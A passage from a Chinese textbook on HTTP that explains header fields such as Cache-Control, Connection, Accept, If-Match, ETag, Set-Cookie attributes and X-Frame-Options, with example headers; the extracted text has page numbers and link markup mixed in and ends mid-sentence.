指令要求所有的缓存服务器在接收到客户端带有该指令的请求返回响应之前，必须再次验证缓存的有效性。no-transform 指令Cache-Control: no-transform使用 no-transform 指令规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。这样做可防止缓存或代理压缩图片等类似操作。Cache-Control 扩展cache-extension tokenCache-Control: private, community=”UCI”通过 cache-extension 标记（token），可以扩展 Cache-Control 首部字段内的指令。如上例，Cache-Control 首部字段本身没有 community 这个指令。借助extension tokens 实现了该指令的添加。如果缓存服务器不能理解community 这个新指令，就会直接忽略。因此，extension tokens 仅对能理解它的缓存服务器来说是有意义的。916.3.2　ConnectionConnection 首部字段具备如下两个作用。控制不再转发给代理的首部字段管理持久连接控制不再转发给代理的首部字段Connection: 不再转发的首部字段名在客户端发送请求和服务器返回响应内，使用 Connection 首部字段，可控制不再转发给代理的首部字段（即 Hop-by-hop 首部）。管理持久连接Connection: close92HTTP/1.1 版本的默认连接都是持久连接。为此，客户端会在持久连接上连续发送请求。当服务器端想明确断开连接时，则指定Connection 首部字段的值为 Close。Connection: Keep-AliveHTTP/1.1 之前的 HTTP 版本的默认连接都是非持久连接。为此，如果想在旧版本的 HTTP 协议上维持持续连接，则需要指定Connection 首部字段的值为 Keep-Alive。如上图①所示，客户端发送请求给服务器时，服务器端会像上图②那样加上首部字段 Keep-Alive 及首部字段 Connection 后返回响应。6.3.3　Date首部字段 Date 表明创建 HTTP 报文的日期和时间。HTTP/1.1 协议使用在 RFC1123 中规定的日期时间的格式，如下 示例。93Date: Tue, 03 Jul 2012 04:40:59 GMT之前的 HTTP 协议版本中使用在 RFC850 中定义的格式，如下所示。Date: Tue, 03-Jul-12 04:40:59 GMT除此之外，还有一种格式。它与 C 标准库内的 asctime() 函数的输出格式一致。Date: Tue Jul 03 04:40:59 20126.3.4　PragmaPragma 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0的向后兼容而定义。规范定义的形式唯一，如下所示。Pragma: no-cache该首部字段属于通用首部字段，但只用在客户端发送的请求中。客户端会要求所有的中间服务器不返回缓存的资源。所有的中间服务器如果都能以 HTTP/1.1 为基准，那直接采用 Cache-Control: no-cache 指定缓存的处理方式是最为理想的。但要整体掌握全部中间服务器使用的 HTTP 协议版本却是不现实的。因此，发送的请求会同时含有下面两个首部字段。Cache-Control: no-cachePragma: no-cache946.3.5　Trailer首部字段 Trailer 会事先说明在报文主体后记录了哪些首部字段。该首部字段可应用在 HTTP/1.1 版本分块传输编码时。HTTP/1.1 200 OKDate: Tue, 03 Jul 2012 04:40:56 GMTContent-Type: text/html…Transfer-Encoding: chunkedTrailer: Expires…(报文主体)…0Expires: Tue, 28 Sep 2004 23:59:59 GMT以上用例中，指定首部字段 Trailer 的值为 Expires，在报文主体之后（分块长度 0 之后）出现了首部字段 Expires。6.3.6　Transfer-Encoding95首部字段 Transfer-Encoding 规定了传输报文主体时采用的编码方式。HTTP/1.1 的传输编码方式仅对分块传输编码有效。HTTP/1.1 200 OKDate: Tue, 03 Jul 2012 04:40:56 GMTCache-Control: public, max-age=604800Content-Type: text/javascript; charset=utf-8Expires: Tue, 10 Jul 2012 04:40:56 GMTX-Frame-Options: DENYX-XSS-Protection: 1; mode=blockContent-Encoding: gzipTransfer-Encoding: chunkedConnection: keep-alivecf0 ←16进制(10进制为3312)…3312字节分块数据…392 ←16进制(10进制为914)…914字节分块数据…0以上用例中，正如在首部字段 Transfer-Encoding 中指定的那样，有效使用分块传输编码，且分别被分成 3312 字节和 914 字节大小的分块数据。6.3.7　Upgrade首部字段 Upgrade 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，其参数值可以用来指定一个完全不同的通信协议。96上图用例中，首部字段 Upgrade 指定的值为 TLS/1.0。请注意此处两个字段首部字段的对应关系，Connection 的值被指定为 Upgrade。Upgrade 首部字段产生作用的 Upgrade 对象仅限于客户端和邻接服务器之间。因此，使用首部字段 Upgrade 时，还需要额外指定Connection:Upgrade。对于附有首部字段 Upgrade 的请求，服务器可用 101 SwitchingProtocols 状态码作为响应返回。6.3.8　Via使用首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径。报文经过代理或网关时，会先在首部字段 Via 中附加该服务器的信息，然后再进行转发。这个做法和 traceroute 及电子邮件的 Received首部的工作机制很类似。首部字段 Via 不仅用于追踪报文的转发，还可避免请求回环的发生。所以必须在经过代理时附加该首部字段内容。上图用例中，在经过代理服务器 A 时，Via 首部附加了“1.0gw.hackr.jp (Squid/3.1)”这样的字符串值。行头的 1.0 是指接收请求的97服务器上应用的 HTTP 协议版本。接下来经过代理服务器 B 时亦是如此，在 Via 首部附加服务器信息，也可增加 1 个新的 Via 首部写入服务器信息。Via 首部是为了追踪传输路径，所以经常会和 TRACE 方法一起使用。比如，代理服务器接收到由 TRACE 方法发送过来的请求（其中Max-Forwards: 0）时，代理服务器就不能再转发该请求了。这种情况下，代理服务器会将自身的信息附加到 Via 首部后，返回该请求的响应。6.3.9　WarningHTTP/1.1 的 Warning 首部是从 HTTP/1.0 的响应首部（Retry-After）演变过来的。该首部通常会告知用户一些与缓存相关的问题的警告。Warning: 113 gw.hackr.jp:8080 “Heuristic expiration” Tue, 03 Jul 2012 Warning 首部的格式如下。最后的日期时间部分可省略。Warning: [警告码][警告的主机:端口号]“[警告内容]”([日期时间])HTTP/1.1 中定义了 7 种警告。警告码对应的警告内容仅推荐参考。另外，警告码具备扩展性，今后有可能追加新的警告码。表 6-7：HTTP/1.1 警告码警告码 警告内容 说明110 Response is stale（响应已过期） 代理返回已过期的资源111 Revalidation failed（再验证失败）代理再验证资源有效性时失败（服务器无法到达等原因）112Disconnection operation（断开连接操作）代理与互联网连接被故意切断113 Heuristic expiration（试探性过期）响应的使用期超过24小时（有效缓存的设定时间大于24小时的情况下）199 Miscellaneous warning（杂项警告） 任意的警告内容214 Transformation applied（使用了转换）代理对内容编码或媒体类型等执行了某些处理时299Miscellaneous persistent warning（持久杂项警告）任意的警告内容986.4　请求首部字段请求首部字段是从客户端往服务器端发送请求报文中所使用的字段，用于补充请求的附加信息、客户端信息、对响应内容相关的优先级等内容。图：HTTP 请求报文中使用的首部字段6.4.1　AcceptAccept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.Accept 首部字段可通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可使用 type/subtype 这种形式，一次指定多种媒体类型。下面我们试举几个媒体类型的例子。99文本文件text/html, text/plain, text/css …application/xhtml+xml, application/xml …图片文件image/jpeg, image/gif, image/png …视频文件video/mpeg, video/quicktime …应用程序使用的二进制文件application/octet-stream, application/zip …比如，如果浏览器不支持 PNG 图片的显示，那 Accept 就不指定image/png，而指定可处理的 image/gif 和 image/jpeg 等图片类型。若想要给显示的媒体类型增加优先级，则使用 q= 来额外表示权重值1 ，用分号（;）进行分隔。权重值 q 的范围是 0~1（可精确到小数点后 3 位），且 1 为最大值。不指定权重 q 值时，默认权重为 q=1.0。1 原文是“品質係数”。在 RFC2616 定义中，此处的 q 是指 qvalue，即 qualityfactor。直译的话就是质量数，但经过综合考虑理解记忆的便利性后，似乎采用权重值更为稳妥。——译者注当服务器提供多种内容时，将会首先返回权重值最高的媒体类型。6.4.2　Accept-Charset100Accept-Charset: iso-8859-5, unicode-1-1;q=0.8Accept-Charset 首部字段可用来通知服务器用户代理支持的字符集及字符集的相对优先顺序。另外，可一次性指定多种字符集。与首部字段 Accept 相同的是可用权重 q 值来表示相对优先级。该首部字段应用于内容协商机制的服务器驱动协商。6.4.3　Accept-EncodingAccept-Encoding: gzip, deflateAccept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及内容编码的优先级顺序。可一次性指定多种内容编码。101下面试举出几个内容编码的例子。gzip由文件压缩程序 gzip（GNU zip）生成的编码格式（RFC1952），采用 Lempel-Ziv 算法（LZ77）及 32 位循环冗余校验（Cyclic Redundancy Check，通称 CRC）。compress由 UNIX 文件压缩程序 compress 生成的编码格式，采用 Lempel-Ziv-Welch 算法（LZW）。deflate组合使用 zlib 格式（RFC1950）及由 deflate 压缩算法（RFC1951）生成的编码格式。identity不执行压缩或不会变化的默认编码格式采用权重 q 值来表示相对优先级，这点与首部字段 Accept 相同。另外，也可使用星号（<em>）作为通配符，指定任意的编码格式。6.4.4　Accept-Language102Accept-Language: zh-cn,zh;q=0.7,en-us,en;q=0.3首部字段 Accept-Language 用来告知服务器用户代理能够处理的自然语言集（指中文或英文等），以及自然语言集的相对优先级。可一次指定多种自然语言集。和 Accept 首部字段一样，按权重值 q 来表示相对优先级。在上述图例中，客户端在服务器有中文版资源的情况下，会请求其返回中文版对应的响应，没有中文版时，则请求返回英文版响应。6.4.5　Authorization103Authorization: Basic dWVub3NlbjpwYXNzd29yZA==首部字段 Authorization 是用来告知服务器，用户代理的认证信息（证书值）。通常，想要通过服务器认证的用户代理会在接收到返回的401 状态码响应后，把首部字段 Authorization 加入请求中。共用缓存在接收到含有 Authorization 首部字段的请求时的操作处理会略有差异。有关 HTTP 访问认证及 Authorization 首部字段，稍后的章节还会详细说明。另外，读者也可参阅 RFC2616。6.4.6　Expect104Expect: 100-continue客户端使用首部字段 Expect 来告知服务器，期望出现的某种特定行为。因服务器无法理解客户端的期望作出回应而发生错误时，会返回状态码 417 Expectation Failed。客户端可以利用该首部字段，写明所期望的扩展。虽然 HTTP/1.1 规范只定义了 100-continue（状态码 100 Continue 之意）。等待状态码 100 响应的客户端在发生请求时，需要指定 Expect:100-continue。6.4.7　From首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地址。通常，其使用目的就是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式。使用代理时，应尽可能包含 From 首部字段（但可能会因代理不同，将电子邮件地址记录在 User-Agent 首部字段内）。1056.4.8　Host图：虚拟主机运行在同一个 IP 上，因此使用首部字段 Host 加以区分Host: <a href="http://www.hackr.jp首部字段" target="_blank" rel="noopener">www.hackr.jp首部字段</a> Host 会告知服务器，请求的资源所处的互联网主机名和端口号。Host 首部字段在 HTTP/1.1 规范内是唯一一个必须被包含在请求内的首部字段。首部字段 Host 和以单台服务器分配多个域名的虚拟主机的工作机制有很密切的关联，这是首部字段 Host 必须存在的意义。请求被发送至服务器时，请求中的主机名会用 IP 地址直接替换解决。但如果这时，相同的 IP 地址下部署运行着多个域名，那么服务器就会无法理解究竟是哪个域名对应的请求。因此，就需要使用首部字段 Host 来明确指出请求的主机名。若服务器未设定主机名，那直接发送一个空值即可。如下所示。Host:6.4.9　If-Match106图：附带条件请求形如 If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。图：只有当 If-Match 的字段值跟 ETag 值匹配一致时，服务器才会接受请求107If-Match: “123456”首部字段 If-Match，属附带条件之一，它会告知服务器匹配资源所用的实体标记（ETag）值。这时的服务器无法使用弱 ETag 值。（请参照本章有关首部字段 ETag 的说明）服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致时，才会执行请求。反之，则返回状态码 412 Precondition Failed 的响应。还可以使用星号（</em>）指定 If-Match 的字段值。针对这种情况，服务器将会忽略 ETag 的值，只要资源存在就处理请求。6.4.10　If-Modified-Since图：如果在 If-Modified-Since 字段指定的日期时间后，资源发生了更新，服务器会接受请求108If-Modified-Since: Thu, 15 Apr 2004 00:00:00 GMT首部字段 If-Modified-Since，属附带条件之一，它会告知服务器若 If-Modified-Since 字段值早于资源的更新时间，则希望能处理该请求。而在指定 If-Modified-Since 字段值的日期时间之后，如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应。If-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。获取资源的更新日期时间，可通过确认首部字段 Last-Modified 来确定。6.4.11　If-None-Match图：只有在 If-None-Match 的字段值与 ETag 值不一致时，可处理该请求。与 If-Match 首部字段的作用相反首部字段 If-None-Match 属于附带条件之一。它和首部字段 If-Match作用相反。用于指定 If-None-Match 字段值的实体标记（ETag）值与请求资源的 ETag 不一致时，它就告知服务器处理该请求。在 GET 或 HEAD 方法中使用首部字段 If-None-Match 可获取最新的资源。因此，这与使用首部字段 If-Modified-Since 时有些类似。6.4.12　If-Range109首部字段 If-Range 属于附带条件之一。它告知服务器若指定的 If-Range 字段值（ETag 值或者时间）和请求资源的 ETag 值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。110下面我们思考一下不使用首部字段 If-Range 发送请求的情况。服务器端的资源如果更新，那客户端持有资源中的一部分也会随之无效，当然，范围请求作为前提是无效的。这时，服务器会暂且以状态码 412Precondition Failed 作为响应返回，其目的是催促客户端再次发送请求。这样一来，与使用首部字段 If-Range 比起来，就需要花费两倍的功夫。6.4.13　If-Unmodified-SinceIf-Unmodified-Since: Thu, 03 Jul 2012 00:00:00 GMT首部字段 If-Unmodified-Since 和首部字段 If-Modified-Since 的作用相反。它的作用的是告知服务器，指定的请求资源只有在字段值内指定的日期时间之后，未发生更新的情况下，才能处理请求。如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。6.4.14　Max-Forwards111图：每次转发数值减 1。当数值变 0 时返回响应Max-Forwards: 10通过 TRACE 方法或 OPTIONS 方法，发送包含首部字段 Max-Forwards 的请求时，该字段以十进制整数形式指定可经过的服务器最大数目。服务器在往下一个服务器转发请求之前，Max-Forwards 的值减 1 后重新赋值。当服务器接收到 Max-Forwards 值为 0 的请求时，则不再进行转发，而是直接返回响应。使用 HTTP 协议通信时，请求可能会经过代理等多台服务器。途中，如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到服务器返回的响应了。对此，我们无从可知。可以灵活使用首部字段 Max-Forwards，针对以上问题产生的原因展开调查。由于当 Max-Forwards 字段值为 0 时，服务器就会立即返回响应，由此我们至少可以对以那台服务器为终点的传输路径的通信状况有所把握。图：代理 B 到源服务器的请求失败了，但客户端不知道112图：由于未知原因，导致请求陷入代理之间的循环，但客户端不知道6.4.15　Proxy-AuthorizationProxy-Authorization: Basic dGlwOjkpNLAGfFY5接收到从代理服务器发来的认证质询时，客户端会发送包含首部字段Proxy-Authorization 的请求，以告知服务器认证所需要的信息。这个行为是与客户端和服务器之间的 HTTP 访问认证相类似的，不同之处在于，认证行为发生在客户端与代理之间。客户端与服务器之间的认证，使用首部字段 Authorization 可起到相同作用。有关 HTTP 访问认证，后面的章节会作详尽阐述。6.4.16　RangeRange: bytes=5001-10000对于只需获取部分资源的范围请求，包含首部字段 Range 即可告知服务器资源的指定范围。上面的示例表示请求获取从第 5001 字节至第10000 字节的资源。接收到附带 Range 首部字段请求的服务器，会在处理请求之后返回状态码为 206 Partial Content 的响应。无法处理该范围请求时，则会返回状态码 200 OK 的响应及全部资源。1136.4.17　RefererReferer: <a href="http://www.hackr.jp/index.htm首部字段" target="_blank" rel="noopener">http://www.hackr.jp/index.htm首部字段</a> Referer 会告知服务器请求的原始资源的 URI。客户端一般都会发送 Referer 首部字段给服务器。但当直接在浏览器的地址栏输入 URI，或出于安全性的考虑时，也可以不发送该首部字段。因为原始资源的 URI 中的查询字符串可能含有 ID 和密码等保密信息，要是写进 Referer 转发给其他服务器，则有可能导致保密信息的泄露。另外，Referer 的正确的拼写应该是 Referrer，但不知为何，大家一直沿用这个错误的拼写。6.4.18　TETE: gzip, deflate;q=0.5首部字段 TE 会告知服务器客户端能够处理响应的传输编码方式及相对优先级。它和首部字段 Accept-Encoding 的功能很相像，但是用于传输编码。首部字段 TE 除指定传输编码之外，还可以指定伴随 trailer 字段的分块传输编码的方式。应用后者时，只需把 trailers 赋值给该字段值。TE: trailers1146.4.189　User-Agent图：User-Agent 用于传达浏览器的种类User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/2010010首部字段 User-Agent 会将创建请求的浏览器和用户代理名称等信息传达给服务器。由网络爬虫发起请求时，有可能会在字段内添加爬虫作者的电子邮件地址。此外，如果请求经过代理，那么中间也很可能被添加上代理服务器的名称。6.5　响应首部字段响应首部字段是由服务器端向客户端返回响应报文中所使用的字段，用于补充响应的附加信息、服务器信息，以及对客户端的附加要求等信息。115图：HTTP 响应报文中使用的首部字段6.5.1　Accept-Ranges图：当不能处理范围请求时，Accept-Ranges: noneAccept-Ranges: bytes首部字段 Accept-Ranges 是用来告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。可指定的字段值有两种，可处理范围请求时指定其为 bytes，反之则指定其为 none。6.5.2　Age116Age: 600首部字段 Age 能告知客户端，源服务器在多久前创建了响应。字段值的单位为秒。若创建该响应的服务器是缓存服务器，Age 值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须加上首部字段Age。6.5.3　ETagETag: “82e22293907ce725faf67773957acd12”首部字段 ETag 能告知客户端实体标识。它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的 ETag值。117另外，当资源更新时，ETag 值也需要更新。生成 ETag 值时，并没有统一的算法规则，而仅仅是由服务器来分配。资源被缓存时，就会被分配唯一性标识。例如，当使用中文版的浏览器访问 <a href="http://www.google.com/" target="_blank" rel="noopener">http://www.google.com/</a> 时，就会返回中文版对应的资源，而使用英文版的浏览器访问时，则会返回英文版对应的资源。两者的URI 是相同的，所以仅凭 URI 指定缓存的资源是相当困难的。若在下载过程中出现连接中断、再连接的情况，都会依照 ETag 值来指定资源。强 ETag 值和弱 Tag 值ETag 中有强 ETag 值和弱 ETag 值之分。强 ETag 值强 ETag 值，不论实体发生多么细微的变化都会改变其值。ETag: “usagi-1234”弱 ETag 值弱 ETag 值只用于提示资源是否相同。只有资源发生了根本改变，产生差异时才会改变 ETag 值。这时，会在字段值最开始处附加 W/。ETag: W/“usagi-1234”6.5.4　Location118Location: <a href="http://www.usagidesign.jp/sample.html使用首部字段" target="_blank" rel="noopener">http://www.usagidesign.jp/sample.html使用首部字段</a> Location 可以将响应接收方引导至某个与请求 URI 位置不同的资源。基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的URI。几乎所有的浏览器在接收到包含首部字段 Location 的响应后，都会强制性地尝试对已提示的重定向资源的访问。6.5.5　Proxy-AuthenticateProxy-Authenticate: Basic realm=”Usagidesign Auth”119首部字段 Proxy-Authenticate 会把由代理服务器所要求的认证信息发送给客户端。它与客户端和服务器之间的 HTTP 访问认证的行为相似，不同之处在于其认证行为是在客户端与代理之间进行的。而客户端与服务器之间进行认证时，首部字段 WWW-Authorization 有着相同的作用。有关HTTP 访问认证，后面的章节会再进行详尽阐述。6.5.6　Retry-AfterRetry-After: 120首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使用。字段值可以指定为具体的日期时间（Wed, 04 Jul 2012 06：34：24GMT 等格式），也可以是创建响应后的秒数。6.5.7　Server120Server: Apache/2.2.17 (Unix)首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。Server: Apache/2.2.6 (Unix) PHP/5.2.56.5.8　Vary图：当代理服务器接收到带有 Vary 首部字段指定获取资源的请求时，如果使用的 Accept-Language 字段的值相同，那么就直接从缓存返回响应。反之，则需要先从源服务器端获取资源后才能作为121响应返回Vary: Accept-Language首部字段 Vary 可对缓存进行控制。源服务器会向代理服务器传达关于本地缓存使用方法的命令。从代理服务器接收到源服务器返回包含 Vary 指定项的响应之后，若再要进行缓存，仅对请求中含有相同 Vary 指定首部字段的请求返回缓存。即使对相同资源发起请求，但由于 Vary 指定的首部字段不相同，因此必须要从源服务器重新获取资源。6.5.9　WWW-AuthenticateWWW-Authenticate: Basic realm=”Usagidesign Auth”首部字段 WWW-Authenticate 用于 HTTP 访问认证。它会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或是 Digest）和带参数提示的质询（challenge）。状态码 401 Unauthorized 响应中，肯定带有首部字段 WWW-Authenticate。上述示例中，realm 字段的字符串是为了辨别请求 URI 指定资源所受到的保护策略。有关该首部，请参阅本章之后的内容。6.6　实体首部字段实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等与实体相关的信息。图：在请求和响应两方的 HTTP 报文中都含有与实体相关的首部122字段6.6.1　AllowAllow: GET, HEAD首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 Allow 后返回。6.6.2　Content-EncodingContent-Encoding: gzip首部字段 Content-Encoding 会告知客户端服务器对实体的主体部分选用的内容编码方式。内容编码是指在不丢失实体信息的前提下所进行的压缩。主要采用以下 4 种内容编码的方式。（各方式的说明请参考 6.4.3 节Accept-Encoding 首部字段）。gzip123compressdeflateidentity6.6.3　Content-LanguageContent-Language: zh-CN首部字段 Content-Language 会告知客户端，实体主体使用的自然语言（指中文或英文等语言）。6.6.4　Content-LengthContent-Length: 15000首部字段 Content-Length 表明了实体主体部分的大小（单位是字节）。对实体主体进行内容编码传输时，不能再使用 Content-Length首部字段。由于实体主体大小的计算方法略微复杂，所以在此不再展开。读者若想一探究竟，可参考 RFC2616 的 4.4。6.6.5　Content-Location124Content-Location: <a href="http://www.hackr.jp/index-ja.html首部字段" target="_blank" rel="noopener">http://www.hackr.jp/index-ja.html首部字段</a> Content-Location 给出与报文主体部分相对应的 URI。和首部字段 Location 不同，Content-Location 表示的是报文主体返回资源对应的 URI。比如，对于使用首部字段 Accept-Language 的服务器驱动型请求，当返回的页面内容与实际请求的对象不同时，首部字段 Content-Location内会写明 URI。（访问 <a href="http://www.hackr.jp/" target="_blank" rel="noopener">http://www.hackr.jp/</a> 返回的对象却是<a href="http://www.hackr.jp/index-ja.html" target="_blank" rel="noopener">http://www.hackr.jp/index-ja.html</a> 等类似情况）6.6.6　Content-MD5图：客户端会对接收的报文主体执行相同的 MD5 算法，然后与首部字段 Content-MD5 的字段值比较Content-MD5: OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY==首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。对报文主体执行 MD5 算法获得的 128 位二进制数，再通过 Base64 编码后将结果写入 Content-MD5 字段值。由于 HTTP 首部无法记录二进制值，所以要通过 Base64 编码处理。为确保报文的有效性，作为接收方的客户端会对报文主体再执行一次相同的 MD5 算法。计算出的125值与字段值作比较后，即可判断出报文主体的准确性。采用这种方法，对内容上的偶发性改变是无从查证的，也无法检测出恶意篡改。其中一个原因在于，内容如果能够被篡改，那么同时意味着 Content-MD5 也可重新计算然后被篡改。所以处在接收阶段的客户端是无法意识到报文主体以及首部字段 Content-MD5 是已经被篡改过的。6.6.7　Content-RangeContent-Range: bytes 5001-10000/10000针对范围请求，返回响应时使用的首部字段 Content-Range，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小。6.6.8　Content-TypeContent-Type: text/html; charset=UTF-8126首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字段 Accept 一样，字段值用 type/subtype 形式赋值。参数 charset 使用 iso-8859-1 或 euc-jp 等字符集进行赋值。6.6.9　ExpiresExpires: Wed, 04 Jul 2012 08:26:05 GMT首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。源服务器不希望缓存服务器对资源缓存时，最好在 Expires 字段内写入与首部字段 Date 相同的时间值。但是，当首部字段 Cache-Control 有指定 max-age 指令时，比起首部字段 Expires，会优先处理 max-age 指令。6.6.10　Last-Modified127Last-Modified: Wed, 23 May 2012 09:59:55 GMT首部字段 Last-Modified 指明资源最终修改的时间。一般来说，这个值就是 Request-URI 指定资源被修改的时间。但类似使用 CGI 脚本进行动态数据处理时，该值有可能会变成数据最终修改时的时间。6.7　为 Cookie 服务的首部字段管理服务器与客户端之间状态的 Cookie，虽然没有被编入标准化HTTP/1.1 的 RFC2616 中，但在 Web 网站方面得到了广泛的应用。Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接着当用户访问该Web网站时，可通过通信方式取回之前发放的Cookie。调用 Cookie 时，由于可校验 Cookie 的有效期，以及发送方的域、路径、协议等信息，所以正规发布的 Cookie 内的数据不会因来自其他Web 站点和攻击者的攻击而泄露。至 2013 年 5 月，Cookie 的规格标准文档有以下 4 种。由网景公司颁布的规格标准网景通信公司设计并开发了 Cookie，并制定相关的规格标准。1994年前后，Cookie 正式应用在网景浏览器中。目前最为普及的 Cookie方式也是以此为基准的。RFC2109某企业尝试以独立技术对 Cookie 规格进行标准化统筹。原本的意图是想和网景公司制定的标准交互应用，可惜发生了微妙的差异。现在该标准已淡出了人们的视线。RFC2965为终结 Internet Explorer 浏览器与 Netscape Navigator 的标准差异而导致的浏览器战争，RFC2965 内定义了新的 HTTP 首部 Set-Cookie2 和Cookie2。可事实上，它们几乎没怎么投入使用。128RFC6265将网景公司制定的标准作为业界事实标准（De facto standard），重新定义 Cookie 标准后的产物。目前使用最广泛的 Cookie 标准却不是 RFC 中定义的任何一个。而是在网景公司制定的标准上进行扩展后的产物。本节接下来就对目前使用最为广泛普及的标准进行说明。下面的表格内列举了与 Cookie 有关的首部字段。表 6-8：为 Cookie 服务的首部字段首部字段名 说明 首部类型Set-Cookie 开始状态管理所使用的Cookie信息 响应首部字段Cookie 服务器接收到的Cookie信息 请求首部字段6.7.1　Set-CookieSet-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; path当服务器准备开始管理客户端的状态时，会事先告知各种信息。下面的表格列举了 Set-Cookie 的字段值。表 6-9：Set-Cookie 字段的属性129属性 说明NAME=VALUE 赋予 Cookie 的名称和其值（必需项）expires=DATE Cookie 的有效期（若不明确指定则默认为浏览器关闭前为止）path=PATH将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）domain=域名作为 Cookie 适用对象的域名 （若不指定则默认为创建 Cookie的服务器的域名）Secure 仅在 HTTPS 安全通信时才会发送 CookieHttpOnly 加以限制，使 Cookie 不能被 JavaScript 脚本访问expires 属性Cookie 的 expires 属性指定浏览器可发送 Cookie 的有效期。当省略 expires 属性时，其有效期仅限于维持浏览器会话（Session）时间段内。这通常限于浏览器应用程序被关闭之前。另外，一旦 Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除 Cookie 的方法。但可通过覆盖已过期的 Cookie，实现对客户端 Cookie 的实质性删除操作。path 属性Cookie 的 path 属性可用于限制指定 Cookie 的发送范围的文件目录。不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱有期待。domain 属性通过 Cookie 的 domain 属性指定的域名可做到与结尾匹配一致。比如，当指定 example.com 后，除 example.com 以外，<a href="http://www.example.com或" target="_blank" rel="noopener">www.example.com或</a> www2.example.com 等都可以发送 Cookie。因此，除了针对具体指定的多个域名发送 Cookie 之 外，不指定domain 属性显得更安全。secure 属性Cookie 的 secure 属性用于限制 Web 页面仅在 HTTPS 安全连接时，才可以发送 Cookie。130发送 Cookie 时，指定 secure 属性的方法如下所示。Set-Cookie: name=value; secure以上例子仅当在 <a href="https://www.example.com/（HTTPS）安全连接的情况下才会进行" target="_blank" rel="noopener">https://www.example.com/（HTTPS）安全连接的情况下才会进行</a> Cookie 的回收。也就是说，即使域名相同，<a href="http://www.example.com/（HTTP）也不会发生" target="_blank" rel="noopener">http://www.example.com/（HTTP）也不会发生</a> Cookie 回收行为。当省略 secure 属性时，不论 HTTP 还是 HTTPS，都会对 Cookie 进行回收。HttpOnly 属性Cookie 的 HttpOnly 属性是 Cookie 的扩展功能，它使 JavaScript 脚本无法获得 Cookie。其主要目的为防止跨站脚本攻击（Cross-sitescripting，XSS）对 Cookie 的信息窃取。发送指定 HttpOnly 属性的 Cookie 的方法如下所示。Set-Cookie: name=value; HttpOnly通过上述设置，通常从 Web 页面内还可以对 Cookie 进行读取操作。但使用 JavaScript 的 document.cookie 就无法读取附加 HttpOnly 属性后的 Cookie 的内容了。因此，也就无法在 XSS 中利用 JavaScript 劫持Cookie 了。虽然是独立的扩展功能，但 Internet Explorer 6 SP1 以上版本等当下的主流浏览器都已经支持该扩展了。另外顺带一提，该扩展并非是为了防止 XSS 而开发的。6.7.2　CookieCookie: status=enable首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个Cookie 时，同样可以以多个 Cookie 形式发送。6.8　其他首部字段131HTTP 首部字段是可以自行扩展的。所以在 Web 服务器和浏览器的应用上，会出现各种非标准的首部字段。接下来，我们就一些最为常用的首部字段进行说明。X-Frame-OptionsX-XSS-ProtectionDNTP3P6.8.1　X-Frame-OptionsX-Frame-Options: DENY首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击。首部字段 X-Frame-Options 有以下两个可指定的字段值。DENY ：拒绝SAMEORIGIN ：仅同源域名下的页面（Top-level-browsing-context）匹配时许可。（比如，当指定 <a href="http://hackr.jp/sample.html页面为" target="_blank" rel="noopener">http://hackr.jp/sample.html页面为</a> SAMEORIGIN 时，那么 hackr.jp 上所有页面的 frame 都被允许可加载该页面，而 example.com 等其他域名的页面就不行了）支持该首部字段的浏览器有：Internet Explorer 8、Firefox 3.6.9+、Chrome 4.1.249.1042+、Safari 4+ 和 Opera 10.50+ 等。现在主流的浏览器都已经支持。能在所有的 Web 服务器端预先设定好 X-Frame-Options 字段值是最理想的状态。对 apache2.conf 